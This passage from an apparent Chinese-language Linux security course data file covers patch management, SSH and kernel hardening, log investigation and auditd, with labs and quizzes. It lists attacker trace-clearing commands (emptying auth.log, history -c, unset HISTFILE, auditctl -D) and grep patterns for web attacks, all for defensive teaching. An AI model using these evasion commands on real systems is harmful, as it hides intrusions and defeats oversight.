            "example": "**發現系統程式被替換（rootkit 偵測）**：\n"
                       "```\n"
                       "$ rpm -Va | grep -E '^..5'\n"
                       "S.5....T.    /usr/bin/ps\n"
                       "S.5....T.    /usr/bin/netstat\n"
                       "S.5....T.    /usr/bin/ls\n"
                       "```\n"
                       "**`5` 代表 MD5 雜湊不符 = 檔案內容被改過。**\n\n"
                       "`ps`、`netstat`、`ls` 同時被改 → 這是典型的 **rootkit**："
                       "攻擊者替換了這些工具，讓你**看不到他的程序、連線與檔案**。\n\n"
                       "**這也解釋了為什麼入侵調查要用「乾淨的工具」**：\n"
                       "- 從外部掛載硬碟分析\n"
                       "- 用靜態編譯的工具（自己帶 busybox）\n"
                       "- 從記憶體傾印分析（Volatility）\n"
                       "- 用網路端的觀測（交換器上的流量）交叉驗證\n\n"
                       "**「在被入侵的機器上執行該機器的指令」是不可靠的。**",
            "note": "Debian 系用 `sudo apt install debsums && sudo debsums -c` 做同樣的檢查。"
                    "更完整的方案是部署 **AIDE** 或 **Tripwire**，"
                    "在乾淨狀態建立基準資料庫（**存在唯讀或離線媒體**），之後定期比對。",
        },
        {
            "heading": "修補管理：流程比技術重要",
            "body": "**修補管理的五個步驟**：\n\n"
                    "1. **盤點**：你有幾台機器、跑什麼版本？沒有清冊就無法修補。\n"
                    "2. **偵測**：哪些有漏洞？用漏洞掃描（OpenVAS、Nessus）+ 訂閱廠商公告。\n"
                    "3. **分級**：不是全部一起修。依\n"
                    "   - **CVSS 分數**（9.0+ Critical）\n"
                    "   - **是否有公開的攻擊程式（exploit）**\n"
                    "   - **是否對外暴露**\n"
                    "   - **資產重要性**\n"
                    "   四項綜合判斷。\n"
                    "4. **測試 → 部署**：先測試環境 → 少量正式機 → 全面。\n"
                    "5. **驗證**：修完要確認真的修好了（重新掃描）。\n\n"
                    "**常見的 SLA 目標（業界慣例，各家不同）**：\n"
                    "- 對外系統的 Critical：**24–72 小時內**\n"
                    "- 對外系統的 High：**7 天內**\n"
                    "- 內部系統 Critical：**7–14 天**\n"
                    "- 其他：**下一個月度維護窗口**",
            "example": "**為什麼「有 exploit」比「CVSS 高」更重要**：\n\n"
                       "假設有兩個漏洞：\n"
                       "- A：CVSS 9.8，但需要非常特殊的條件，沒有公開 exploit\n"
                       "- B：CVSS 7.5，但已被列入 **CISA KEV**（已知被實際利用清單），"
                       "而且 Metasploit 有現成模組\n\n"
                       "**應該先修 B。** 因為分數衡量的是「理論嚴重度」，"
                       "而「已被實際利用」衡量的是**真實風險**。\n\n"
                       "**實務建議的優先順序**：\n"
                       "```\n"
                       "1. 在 CISA KEV 清單上 + 對外暴露        → 立即\n"
                       "2. 有公開 exploit + 對外暴露            → 24 小時\n"
                       "3. CVSS 9.0+ 對外暴露                   → 72 小時\n"
                       "4. CISA KEV + 僅內部                    → 7 天\n"
                       "5. CVSS 9.0+ 僅內部                     → 14 天\n"
                       "6. 其他                                 → 月度窗口\n"
                       "```\n\n"
                       "**如果真的無法修補**（老舊系統、廠商不支援）→ "
                       "必須加**補償控制**：網路隔離、虛擬修補（IPS 規則）、"
                       "加強監控，並正式記錄風險接受。",
            "note": "**自動更新的取捨**：安全性更新自動裝（Ubuntu 的 `unattended-upgrades`）"
                    "對大多數環境是淨正面。但**關鍵生產系統**應該用維護窗口，"
                    "因為一次壞掉的更新造成的停機可能比漏洞更嚴重。"
                    "折衷做法：非關鍵機器自動、關鍵機器排程 + 測試。",
        },
        {
            "heading": "系統加固：CIS Benchmark 的核心項目",
            "body": "**加固的第一原則：最小化。** 沒安裝的東西不會有漏洞。\n\n"
                    "**必做的十二項（濃縮版 CIS Benchmark）**：\n\n"
                    "1. **移除不必要的套件與服務** — 特別是 telnet、rsh、ftp、"
                    "xinetd、圖形介面（伺服器不需要）\n"
                    "2. **關閉不必要的監聽 port** — `ss -tulnp` 逐一確認\n"
                    "3. **SSH 加固** — 見下方範例\n"
                    "4. **主機防火牆預設拒絕** — ufw / firewalld / nftables\n"
                    "5. **強制密碼政策** — 長度、複雜度、歷史、鎖定\n"
                    "6. **移除不必要的 SUID/SGID**\n"
                    "7. **分割掛載點並加安全選項** — `/tmp`、`/var`、`/home` 獨立分割，"
                    "加上 `noexec,nosuid,nodev`\n"
                    "8. **啟用 SELinux 或 AppArmor**（enforcing 模式）\n"
                    "9. **核心參數加固** — `/etc/sysctl.d/`\n"
                    "10. **啟用 auditd 稽核**\n"
                    "11. **設定 umask 027**\n"
                    "12. **日誌集中外送** — 避免被入侵者刪掉",
            "example": "**SSH 加固的完整設定**（`/etc/ssh/sshd_config`）：\n"
                       "```\n"
                       "# 禁止 root 直接登入 — 強迫使用一般帳號 + sudo（留下紀錄）\n"
                       "PermitRootLogin no\n"
                       "\n"
                       "# 只允許金鑰登入，完全關閉密碼（擋掉所有暴力破解）\n"
                       "PasswordAuthentication no\n"
                       "KbdInteractiveAuthentication no\n"
                       "PubkeyAuthentication yes\n"
                       "\n"
                       "# 白名單：只有這些人／群組能 SSH\n"
                       "AllowGroups ssh-users\n"
                       "\n"
                       "# 限制嘗試與連線數\n"
                       "MaxAuthTries 3\n"
                       "MaxSessions 4\n"
                       "LoginGraceTime 30\n"
                       "\n"
                       "# 閒置自動斷線\n"
                       "ClientAliveInterval 300\n"
                       "ClientAliveCountMax 2\n"
                       "\n"
                       "# 關閉不需要的功能\n"
                       "X11Forwarding no\n"
                       "AllowAgentForwarding no\n"
                       "PermitEmptyPasswords no\n"
                       "\n"
                       "# 只用現代加密演算法\n"
                       "KexAlgorithms curve25519-sha256,diffie-hellman-group16-sha512\n"
                       "Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com\n"
                       "MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com\n"
                       "\n"
                       "# 完整日誌\n"
                       "LogLevel VERBOSE\n"
                       "```\n"
                       "**改完務必先驗證再重啟**：\n"
                       "```\n"
                       "sudo sshd -t              # 檢查語法\n"
                       "sudo systemctl reload ssh # reload 不會斷掉現有連線\n"
                       "```\n"
                       "**遠端操作時，永遠先開第二個 SSH 連線測試，"
                       "確認能登入才關掉原本那個。**",
            "note": "**`PasswordAuthentication no` 是投報率最高的單一設定。**"
                    "它一次消滅了「暴力破解」「撞庫」「弱密碼」三類攻擊。"
                    "代價是必須管理金鑰 — 但這是值得的交換。",
        },
        {
            "heading": "核心參數與掛載點加固",
            "body": "**核心參數（`/etc/sysctl.d/99-hardening.conf`）**：\n"
                    "```\n"
                    "# 網路層防護\n"
                    "net.ipv4.conf.all.rp_filter = 1           # 反向路徑檢查，擋 IP 偽造\n"
                    "net.ipv4.conf.all.accept_source_route = 0 # 關閉來源路由\n"
                    "net.ipv4.conf.all.accept_redirects = 0    # 不接受 ICMP 重導向\n"
                    "net.ipv4.conf.all.send_redirects = 0\n"
                    "net.ipv4.icmp_echo_ignore_broadcasts = 1  # 擋 Smurf 放大攻擊\n"
                    "net.ipv4.tcp_syncookies = 1               # 抗 SYN Flood\n"
                    "net.ipv4.conf.all.log_martians = 1        # 記錄異常來源封包\n"
                    "\n"
                    "# 記憶體與程序防護\n"
                    "kernel.randomize_va_space = 2             # ASLR 完全啟用\n"
                    "kernel.kptr_restrict = 2                  # 隱藏核心位址\n"
                    "kernel.dmesg_restrict = 1                 # 一般使用者不能看核心訊息\n"
                    "fs.suid_dumpable = 0                      # SUID 程式不產生 core dump\n"
                    "kernel.yama.ptrace_scope = 1              # 限制程序互相偷看記憶體\n"
                    "\n"
                    "# 若不需要 IPv6，明確關閉（避免未受管控的旁路）\n"
                    "net.ipv6.conf.all.disable_ipv6 = 1\n"
                    "```\n"
                    "套用：`sudo sysctl --system`\n\n"
                    "**掛載點安全選項（`/etc/fstab`）**：\n"
                    "- `noexec` — 這個分割區裡的檔案**不能執行**\n"
                    "- `nosuid` — 忽略 SUID/SGID 位\n"
                    "- `nodev` — 不允許裝置檔案\n"
                    "- `ro` — 唯讀",
            "example": "**`/tmp` 加固的實際效果**：\n"
                       "```\n"
                       "# /etc/fstab\n"
                       "tmpfs  /tmp      tmpfs  defaults,noexec,nosuid,nodev,size=2G  0 0\n"
                       "tmpfs  /dev/shm  tmpfs  defaults,noexec,nosuid,nodev          0 0\n"
                       "```\n"
                       "**效果驗證**：\n"
                       "```\n"
                       "$ cp /bin/ls /tmp/test && /tmp/test\n"
                       "bash: /tmp/test: Permission denied\n"
                       "```\n"
                       "**這一行設定直接讓「下載到 /tmp 然後執行」這個最常見的攻擊步驟失效。**\n\n"
                       "**注意副作用**：某些軟體（部分安裝程式、Java 的暫存執行）"
                       "需要在 /tmp 執行。導入前要測試，必要時給它專屬的可執行暫存目錄。\n\n"
                       "**其他建議的分割與選項**：\n"
                       "```\n"
                       "/home     nodev,nosuid\n"
                       "/var      nodev\n"
                       "/var/log  nodev,noexec,nosuid\n"
                       "/var/tmp  noexec,nosuid,nodev\n"
                       "/boot     nodev,nosuid,noexec\n"
                       "```",
            "note": "**自動化加固**：不要手工做這些。"
                    "用 **Ansible / Puppet / Chef** 把加固寫成程式碼（IaC），"
                    "這樣才能保證五百台機器設定一致，而且新機器上線就是加固狀態。"
                    "現成方案可參考 CIS 官方的 Ansible playbook 或 OpenSCAP。",
        },
    ],
    "labs": [{
        "title": "檢查修補狀態並驗證加固設定",
        "goal": "跑一次基本的系統健康與加固檢查。",
        "warn": "查詢類指令安全。修改設定請在測試機執行，且 SSH 設定變更前務必保留第二個連線。",
        "steps": [
            {"cmd": "apt list --upgradable 2>/dev/null | head -8",
             "explain": "看有哪些待更新。特別注意 security 來源的套件。",
             "output": "Listing...\nlibssl3/jammy-security 3.0.2-0ubuntu1.19 amd64 [upgradable from: 3.0.2-0ubuntu1.12]\nopenssh-server/jammy-security 1:8.9p1-3ubuntu0.10 amd64 [upgradable from: 1:8.9p1-3ubuntu0.4]\nsudo/jammy-updates 1.9.9-1ubuntu2.4 amd64 [upgradable from: 1.9.9-1ubuntu2.1]\ncurl/jammy-security 7.81.0-1ubuntu1.16 amd64 [upgradable from: 7.81.0-1ubuntu1.10]\n# 四個安全性更新未安裝，其中 openssl 與 openssh 屬高風險，應優先處理"},
            {"cmd": "sudo apt-get -s upgrade | grep -c '^Inst'",
             "explain": "模擬升級（-s 不會真的裝），只算出待更新的套件數量 — 適合做監控指標。",
             "output": "23"},
            {"cmd": "sudo unattended-upgrade --dry-run -d 2>&1 | tail -5",
             "explain": "確認自動安全更新是否設定正確並能運作。",
             "output": "Checking: libssl3 (['<Origin component:'main' archive:'jammy-security' origin:'Ubuntu' label:'Ubuntu' site:'archive.ubuntu.com'>'])\nadjusting candidate version: libssl3=3.0.2-0ubuntu1.19\npkgs that look like they should be upgraded: libssl3 openssh-server curl\nInstalling: (dry-run)\nAll upgrades installed"},
            {"cmd": "sudo sshd -T | grep -iE 'permitrootlogin|passwordauth|maxauthtries|x11forwarding|allowgroups'",
             "explain": "**`sshd -T` 印出實際生效的設定**（含預設值），比直接看設定檔可靠。",
             "output": "permitrootlogin yes\npasswordauthentication yes\nmaxauthtries 6\nx11forwarding yes\n# 四項都不符合加固基準：\n#   permitrootlogin 應為 no\n#   passwordauthentication 應為 no（改金鑰）\n#   maxauthtries 應為 3\n#   x11forwarding 應為 no\n# 另外沒有設定 allowgroups → 所有帳號都能 SSH"},
            {"cmd": "sudo sshd -t && echo '語法檢查通過'",
             "explain": "**改完 sshd_config 一定要先做語法檢查**，否則重啟後可能完全連不進來。",
             "output": "語法檢查通過"},
            {"cmd": "findmnt -o TARGET,FSTYPE,OPTIONS /tmp /dev/shm /home",
             "explain": "檢查關鍵掛載點有沒有 noexec / nosuid / nodev。",
             "output": "TARGET   FSTYPE OPTIONS\n/tmp     ext4   rw,relatime\n/dev/shm tmpfs  rw,nosuid,nodev\n/home    ext4   rw,relatime\n# 問題：/tmp 沒有 noexec,nosuid,nodev → 惡意程式可在此執行\n#       /home 也缺少 nosuid,nodev"},
            {"cmd": "sysctl net.ipv4.tcp_syncookies net.ipv4.conf.all.rp_filter kernel.randomize_va_space",
             "explain": "檢查三個關鍵核心參數：抗 SYN Flood、反向路徑檢查、ASLR。",
             "output": "net.ipv4.tcp_syncookies = 1\nnet.ipv4.conf.all.rp_filter = 2\nkernel.randomize_va_space = 2\n# 三項都已啟用（rp_filter=2 是寬鬆模式，1 是嚴格模式）"},
            {"cmd": "getenforce; sudo aa-status --enabled 2>/dev/null && echo 'AppArmor 啟用中'",
             "explain": "確認 MAC 強制存取控制有沒有在 enforcing 模式。",
             "output": "Disabled\nAppArmor 啟用中\n# SELinux 未啟用，但這台機器用 AppArmor（Ubuntu 預設）→ 可接受\n# 應進一步用 aa-status 確認有多少 profile 在 enforce 模式"},
            {"cmd": "sudo debsums -c 2>/dev/null | head -5",
             "explain": "**完整性檢查**：比對已安裝檔案與套件原始雜湊，找出被篡改的系統程式。",
             "output": "/usr/bin/ps\n/usr/bin/netstat\n/bin/ls\n# 三個系統工具的雜湊不符 → 高度懷疑 rootkit\n# 這類工具被替換後會隱藏攻擊者的程序、連線與檔案\n# 調查必須改用外部乾淨工具或記憶體分析"},
            {"cmd": "systemctl list-unit-files --state=enabled --type=service | wc -l",
             "explain": "數一下開機自啟的服務數量。**最小化原則**：越少越好，每一個都要能說明用途。",
             "output": "42"},
        ],
    }],
    "quiz": [
        {"q": "`rpm -Va` 輸出中出現 `S.5....T.  /usr/bin/ps`，其中 `5` 代表什麼？",
         "options": ["檔案大小改變", "MD5 雜湊不符，代表檔案內容被篡改",
                     "權限改變", "檔案已刪除"],
         "answer": 1,
         "why": "`5` = MD5 不符。ps、netstat、ls 同時被改是 rootkit 的典型特徵，"
                "目的是隱藏攻擊者的程序、連線與檔案。"},
        {"q": "為什麼「在被入侵的機器上執行該機器的指令」不可靠？",
         "options": ["指令太慢", "系統工具可能已被 rootkit 替換，會回報造假的結果",
                     "權限不足", "會產生太多日誌"],
         "answer": 1,
         "why": "應改用外部乾淨工具、離線掛載硬碟分析、記憶體傾印，"
                "或用網路端觀測交叉驗證。"},
        {"q": "有兩個漏洞：A 的 CVSS 9.8 但無公開 exploit；B 的 CVSS 7.5 但在 CISA KEV 清單上且有 Metasploit 模組。應先修哪個？",
         "options": ["A，因為分數較高", "B，因為已被實際利用，真實風險更高",
                     "同時修", "都可以延後"],
         "answer": 1,
         "why": "CVSS 衡量理論嚴重度，「已知被利用」衡量真實風險。"
                "修補優先序應綜合 KEV、exploit 可得性、對外暴露、資產重要性。"},
        {"q": "SSH 加固中投報率最高的單一設定是？",
         "options": ["改變 port 號", "PasswordAuthentication no（只允許金鑰登入）",
                     "X11Forwarding no", "LogLevel VERBOSE"],
         "answer": 1,
         "why": "一次消滅暴力破解、撞庫、弱密碼三類攻擊。改 port 只是障眼法，"
                "掃描器很快就會找到。"},
        {"q": "把 /tmp 掛載成 `noexec,nosuid,nodev` 的效果是？",
         "options": ["禁止寫入 /tmp", "讓放在 /tmp 的檔案無法執行，直接破壞「下載到 /tmp 再執行」的攻擊步驟",
                     "自動清空 /tmp", "加密 /tmp 內容"],
         "answer": 1,
         "why": "這是低成本高效益的加固。但要注意某些軟體需在 /tmp 執行，導入前要測試。"},
        {"q": "修改 sshd_config 後，重啟服務前應該做什麼？",
         "options": ["直接重開機", "執行 `sshd -t` 檢查語法，並保留一個既有連線以防被鎖在外面",
                     "備份整個系統", "關閉防火牆"],
         "answer": 1,
         "why": "語法錯誤會讓 sshd 無法啟動。遠端操作時應先開第二個連線測試成功才關掉原本的。"},
        {"q": "核心參數 `net.ipv4.tcp_syncookies = 1` 的作用是？",
         "options": ["加快連線速度", "在半開連線表滿載時仍能處理合法連線，緩解 SYN Flood",
                     "啟用 IPv6", "記錄所有連線"],
         "answer": 1,
         "why": "SYN Cookie 不預先配置資源，用加密的序號驗證合法連線，是抗 SYN Flood 的標準手段。"},
        {"q": "系統加固的第一原則是什麼？",
         "options": ["安裝最多的安全軟體", "最小化 — 沒安裝的東西不會有漏洞，先移除不必要的套件與服務",
                     "全部設成唯讀", "關閉所有日誌"],
         "answer": 1,
         "why": "縮小攻擊面是零成本且最有效的措施。加固清單的第一項永遠是「移除不需要的東西」。"},
        {"q": "對於無法修補的老舊系統，正確的處理方式是？",
         "options": ["忽略它", "加上補償控制（網路隔離、IPS 虛擬修補、加強監控）並正式記錄風險接受",
                     "直接關機", "改成 chmod 777 讓它能運作"],
         "answer": 1,
         "why": "無法修補時必須有替代控制，並經過正式的風險接受流程（有簽核、有期限、有覆核）。"},
        {"q": "為什麼加固應該用 Ansible 等工具寫成程式碼，而非手工設定？",
         "options": ["比較快打字", "確保大量機器設定一致、可版本控管、新機器上線即為加固狀態",
                     "手工設定違法", "Ansible 比較安全"],
         "answer": 1,
         "why": "手工設定必然產生偏移 (configuration drift)。IaC 讓加固可重複、可稽核、可回溯。"},
    ],
    "keywords": ["apt", "dnf", "rpm", "修補管理", "CVSS", "CISA KEV", "CIS Benchmark",
                 "加固", "SSH 加固", "sysctl", "noexec", "AIDE", "rootkit",
                 "unattended-upgrades", "Ansible", "OpenSCAP"],
    "takeaway": [
        "修補優先序要看「是否已被實際利用 + 是否對外暴露」，不是只看 CVSS。",
        "PasswordAuthentication no 與 /tmp noexec 是兩個投報率極高的加固設定。",
        "在被入侵的機器上執行它自己的指令不可靠 — 要用外部乾淨工具驗證。",
    ],
})

CH.append({
    "id": "l05",
    "title": "日誌、稽核與入侵痕跡調查",
    "subtitle": "journald、syslog、auditd、日誌集中化與反取證",
    "level": "進階",
    "minutes": 24,
    "summary": "沒有日誌就沒有偵測能力，也沒有事後調查能力。日誌是資安工作唯一的「記憶」。",
    "why": "日誌就是**監視器錄影帶**。發生事情時，第一個問題永遠是「錄影還在嗎」。"
           "**而攻擊者第一件事就是想關掉監視器** — 所以日誌必須送到他碰不到的地方。",
    "sections": [
        {
            "heading": "Linux 日誌在哪裡",
            "body": "**傳統檔案式（`/var/log/`）**：\n"
                    "- `auth.log`（Debian）／ `secure`（RHEL）— **認證、sudo、SSH（資安最重要）**\n"
                    "- `syslog` / `messages` — 系統整體訊息\n"
                    "- `kern.log` — 核心訊息\n"
                    "- `nginx/access.log`、`nginx/error.log` — 網頁伺服器\n"
                    "- `wtmp` / `btmp` / `lastlog` — 登入紀錄（**二進位格式，要用指令讀**）\n"
                    "  - `last` 看成功登入、`lastb` 看失敗登入、`lastlog` 看每個帳號最後登入\n\n"
                    "**systemd-journald（現代方式）**：\n"
                    "```\n"
                    "journalctl -u sshd                    # 只看某個服務\n"
                    "journalctl -f                         # 即時追蹤\n"
                    "journalctl --since '1 hour ago'       # 時間範圍\n"
                    "journalctl --since '2026-07-30 09:00' --until '2026-07-30 10:00'\n"
                    "journalctl -p err                     # 只看 error 以上\n"
                    "journalctl -k                         # 核心訊息\n"
                    "journalctl _UID=1000                  # 特定使用者\n"
                    "journalctl -b -1                      # 上一次開機的日誌\n"
                    "journalctl -o json-pretty             # JSON 格式（適合送 SIEM）\n"
                    "journalctl --disk-usage               # 佔用空間\n"
                    "```",
            "example": "**journald 預設是暫存的（重開機就消失）！**\n\n"
                       "很多人不知道這件事。要讓日誌持久化：\n"
                       "```\n"
                       "sudo mkdir -p /var/log/journal\n"
                       "sudo systemd-tmpfiles --create --prefix /var/log/journal\n"
                       "sudo systemctl restart systemd-journald\n"
                       "```\n"
                       "並在 `/etc/systemd/journald.conf` 設定：\n"
                       "```\n"
                       "[Journal]\n"
                       "Storage=persistent\n"
                       "SystemMaxUse=2G\n"
                       "MaxRetentionSec=90day\n"
                       "ForwardToSyslog=yes\n"
                       "```\n\n"
                       "**如果日誌只留三天，你等於沒有調查能力** — "
                       "因為入侵到被發現的中位數往往以數十天計。\n\n"
                       "**保留期建議（依法規與需求）**：\n"
                       "- 一般系統：90 天線上 + 一年歸檔\n"
                       "- 受法規要求（金融、醫療）：常見要求一年以上\n"
                       "- 認證與特權操作日誌：越久越好",
            "note": "考點：`last` 讀 `/var/log/wtmp`、`lastb` 讀 `btmp`（失敗登入）。"
                    "這些是二進位檔，`cat` 會出現亂碼 — 必須用專用指令。",
        },
        {
            "heading": "從日誌裡找出攻擊",
            "body": "**五個必查的模式**：\n\n"
                    "**1. 暴力破解**\n"
                    "```\n"
                    "grep 'Failed password' /var/log/auth.log | wc -l\n"
                    "lastb | head -20\n"
                    "```\n\n"
                    "**2. 暴力破解「成功」了**（最危險的訊號）\n"
                    "```\n"
                    "grep 'Accepted password' /var/log/auth.log\n"
                    "```\n"
                    "**如果同一個 IP 先出現大量 Failed，然後出現 Accepted → 已被攻破。**\n\n"
                    "**3. 帳號與權限變動**\n"
                    "```\n"
                    "grep -E 'useradd|usermod|groupadd|passwd changed' /var/log/auth.log\n"
                    "```\n\n"
                    "**4. sudo 異常使用**\n"
                    "```\n"
                    "grep 'sudo:' /var/log/auth.log | grep -v 'COMMAND=/usr/bin/systemctl'\n"
                    "grep 'NOT in sudoers' /var/log/auth.log   # 有人在試探權限\n"
                    "```\n\n"
                    "**5. 網頁攻擊**\n"
                    "```\n"
                    "grep -iE \"union.*select|'.*or.*'|\\.\\./|<script|etc/passwd\" access.log\n"
                    "awk '$9==404 {print $1}' access.log | sort | uniq -c | sort -rn | head\n"
                    "```",
            "example": "**完整的攻擊時間軸重建**（這是事件調查的核心技能）：\n"
                       "```\n"
                       "# 09:14 — 開始暴力破解\n"
                       "$ grep 'Failed password' auth.log | grep 203.0.113.9 | head -1\n"
                       "Jul 30 09:14:02 srv sshd[3301]: Failed password for invalid user admin from 203.0.113.9\n"
                       "\n"
                       "# 09:47 — 破解成功（同一個 IP！）\n"
                       "$ grep 'Accepted' auth.log | grep 203.0.113.9\n"
                       "Jul 30 09:47:31 srv sshd[4102]: Accepted password for deploy from 203.0.113.9 port 51422 ssh2\n"
                       "\n"
                       "# 09:48 — 建立後門帳號\n"
                       "$ grep useradd auth.log\n"
                       "Jul 30 09:48:11 srv useradd[4155]: new user: name=backupsvc, UID=0, GID=0, home=/root\n"
                       "\n"
                       "# 09:49 — 修改 SSH 設定（可能是開啟 root 登入）\n"
                       "$ ls -l --time-style=full-iso /etc/ssh/sshd_config\n"
                       "-rw-r--r-- 1 root root 3298 2026-07-30 09:49:02 /etc/ssh/sshd_config\n"
                       "\n"
                       "# 09:52 — 建立持續化 cron\n"
                       "$ grep CRON auth.log | tail -2\n"
                       "Jul 30 09:52:44 srv crontab[4287]: (deploy) REPLACE (deploy)\n"
                       "```\n"
                       "**結論**：33 分鐘破解 → 1 分鐘建後門 → 5 分鐘完成持續化。\n\n"
                       "**這個時間軸告訴你三件事**：\n"
                       "1. 為什麼要關閉密碼登入（33 分鐘就破了）\n"
                       "2. 為什麼要即時告警（不是隔天看日誌）\n"
                       "3. 為什麼要監控帳號建立事件（UID=0 的新帳號應該立即告警）",
            "note": "**時間同步是取證的前提**。多台機器的日誌若時間不一致，"
                    "你無法把它們串成一條時間軸。**所有主機必須跑 NTP/chrony 並統一用 UTC 記錄**，"
                    "這是稽核與取證的基本要求。",
        },
        {
            "heading": "auditd：核心層級的稽核",
            "body": "一般日誌記錄的是「應用程式願意告訴你的事」。"
                    "**auditd 記錄的是「核心真正發生的事」** — "
                    "誰讀了哪個檔案、誰執行了什麼、誰改了什麼設定。\n\n"
                    "**設定檔**：`/etc/audit/rules.d/audit.rules`\n"
                    "```\n"
                    "# 監控關鍵檔案的存取與修改\n"
                    "-w /etc/passwd -p wa -k identity\n"
                    "-w /etc/shadow -p wa -k identity\n"
                    "-w /etc/sudoers -p wa -k privilege\n"
                    "-w /etc/sudoers.d/ -p wa -k privilege\n"
                    "-w /etc/ssh/sshd_config -p wa -k sshd\n"
                    "\n"
                    "# 監控持續化位置\n"
                    "-w /etc/crontab -p wa -k persistence\n"
                    "-w /var/spool/cron/ -p wa -k persistence\n"
                    "-w /etc/systemd/system/ -p wa -k persistence\n"
                    "\n"
                    "# 監控所有 root 執行的指令\n"
                    "-a always,exit -F arch=b64 -F euid=0 -S execve -k rootcmd\n"
                    "\n"
                    "# 監控權限變更\n"
                    "-a always,exit -F arch=b64 -S chmod,chown,setuid,setgid -F auid>=1000 -k permchange\n"
                    "\n"
                    "# 監控對外網路連線（量大，視需求啟用）\n"
                    "-a always,exit -F arch=b64 -S connect -F auid>=1000 -k netconn\n"
                    "\n"
                    "# 鎖定規則（之後不能改，除非重開機）\n"
                    "-e 2\n"
                    "```\n"
                    "查詢：`ausearch -k identity -ts today`、`aureport --summary`",
            "example": "**`-e 2` 這個設定為什麼重要**：\n\n"
                       "它把 audit 規則**鎖定**，直到下次重開機都不能修改。\n\n"
                       "這解決了一個根本問題：**如果攻擊者拿到 root，他可以關掉稽核。**"
                       "有了 `-e 2`，他必須重開機才能改規則 — "
                       "而重開機本身就是一個非常明顯的事件。\n\n"
                       "**同樣邏輯的其他設計**：\n"
                       "- **日誌即時外送**：日誌一產生就送到遠端 syslog / SIEM。"
                       "攻擊者刪掉本機檔案，但遠端已經有一份了。\n"
                       "- **WORM 儲存**：Write Once Read Many，寫入後無法修改。\n"
                       "- **不可變備份**：保留期內連管理員都刪不掉。\n\n"
                       "**核心原則：關鍵紀錄不能存放在被記錄者能控制的地方。**",
            "note": "auditd 的代價是**效能與儲存量**。"
                    "全開 `execve` 與 `connect` 在忙碌的伺服器上會產生巨量日誌。"
                    "實務上要依風險挑選規則，並用 `-F auid>=1000` 排除系統帳號的雜訊。",
        },
        {
            "heading": "反取證：攻擊者怎麼清痕跡，你怎麼防",
            "body": "**攻擊者的常見清理手法**：\n\n"
                    "1. **清空日誌**：`> /var/log/auth.log`、`shred`、`logrotate` 濫用\n"
                    "2. **清指令歷史**：`history -c`、`unset HISTFILE`、"
                    "`export HISTSIZE=0`、`rm ~/.bash_history`\n"
                    "3. **改時間戳**：`touch -r 正常檔案 惡意檔案`（讓時間看起來一樣）\n"
                    "4. **改 utmp/wtmp**：專用工具刪除登入紀錄\n"
                    "5. **關閉稽核**：`systemctl stop auditd`、`auditctl -D`\n"
                    "6. **rootkit**：替換 ps/ls/netstat，或用 LD_PRELOAD / 核心模組隱藏\n\n"
                    "**對應的防禦**：\n"
                    "- **日誌即時外送到獨立主機或 SIEM** ← **最重要的一項**\n"
                    "- auditd 加 `-e 2` 鎖定規則\n"
                    "- 用 `chattr +a` 讓日誌檔只能附加不能覆寫\n"
                    "- 檔案完整性監控（AIDE / Tripwire），基準存在離線媒體\n"
                    "- 設定 `PROMPT_COMMAND` 把 shell 指令即時寫入 syslog\n"
                    "- 監控「日誌停止產生」本身就是告警（**沉默是最大的異常**）",
            "example": "**偵測反取證行為的指標**：\n\n"
                       "- 日誌檔案大小突然變成 0，或某段時間完全沒有紀錄\n"
                       "  → **時間軸上的空白比異常紀錄更可疑**\n"
                       "- `.bash_history` 是空的、不存在，或指向 `/dev/null`\n"
                       "- 檔案的 **mtime 比 ctime 早**（改了內容但時間戳被偽造）\n"
                       "  ```\n"
                       "  stat /tmp/.x\n"
                       "  # Modify: 2024-01-15 08:00:00   ← 被偽造成很久以前\n"
                       "  # Change: 2026-07-30 10:38:22   ← inode 變更時間騙不了\n"
                       "  ```\n"
                       "  **`ctime` 幾乎無法用一般工具偽造，這是取證的重要依據。**\n"
                       "- auditd 服務被停止或規則被清空\n"
                       "- 遠端 syslog 收到的紀錄與本機不一致\n\n"
                       "**實務建議：把「日誌量異常下降」設成 SIEM 告警規則。**"
                       "一台平常每小時產生 5000 筆日誌的伺服器突然變成 3 筆，"
                       "這比任何攻擊特徵都值得注意。",
            "note": "**`chattr +a` 的用法**：`sudo chattr +a /var/log/auth.log` "
                    "讓檔案只能附加內容，連 root 都不能覆寫或刪除"
                    "（要先 `chattr -a` 才能改，而這個動作本身可被 auditd 記錄）。"
                    "注意：這會影響 logrotate，需要調整輪替設定。",
        },
    ],
    "diagram": """<svg viewBox="0 0 680 300" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="日誌集中化架構">
<text x="340" y="26" text-anchor="middle" fill="#e2e8f0" font-size="14" font-weight="700">為什麼日誌要送出去：攻擊者刪不到遠端那一份</text>
<rect x="30" y="60" width="120" height="70" rx="8" fill="#2b1414" stroke="#f87171" stroke-width="1.5"/>
<text x="90" y="86" text-anchor="middle" fill="#fca5a5" font-size="12">被入侵主機</text>
<text x="90" y="104" text-anchor="middle" fill="#64748b" font-size="10">攻擊者有 root</text>
<text x="90" y="120" text-anchor="middle" fill="#f87171" font-size="10">可刪本機日誌 ✗</text>
<rect x="30" y="160" width="120" height="70" rx="8" fill="#0f2233" stroke="#38bdf8" stroke-width="1.5"/>
<text x="90" y="186" text-anchor="middle" fill="#7dd3fc" font-size="12">正常主機群</text>
<text x="90" y="204" text-anchor="middle" fill="#64748b" font-size="10">rsyslog / journald</text>
<path d="M152 95 L300 130" stroke="#4ade80" stroke-width="2" fill="none"/>
<path d="M152 195 L300 150" stroke="#4ade80" stroke-width="2" fill="none"/>
<text x="215" y="100" fill="#4ade80" font-size="11">即時外送</text>
<text x="215" y="196" fill="#4ade80" font-size="11">TLS 加密</text>
<rect x="305" y="110" width="130" height="70" rx="8" fill="#132a1e" stroke="#4ade80" stroke-width="2"/>
<text x="370" y="136" text-anchor="middle" fill="#86efac" font-size="12" font-weight="700">日誌收集器</text>
<text x="370" y="154" text-anchor="middle" fill="#64748b" font-size="10">獨立網段</text>
<text x="370" y="170" text-anchor="middle" fill="#64748b" font-size="10">攻擊者無權限</text>
<path d="M437 145 L500 145" stroke="#7dd3fc" stroke-width="2" fill="none"/>
<rect x="505" y="110" width="145" height="70" rx="8" fill="#1a1832" stroke="#a78bfa" stroke-width="1.5"/>
<text x="577" y="136" text-anchor="middle" fill="#c4b5fd" font-size="12" font-weight="700">SIEM</text>
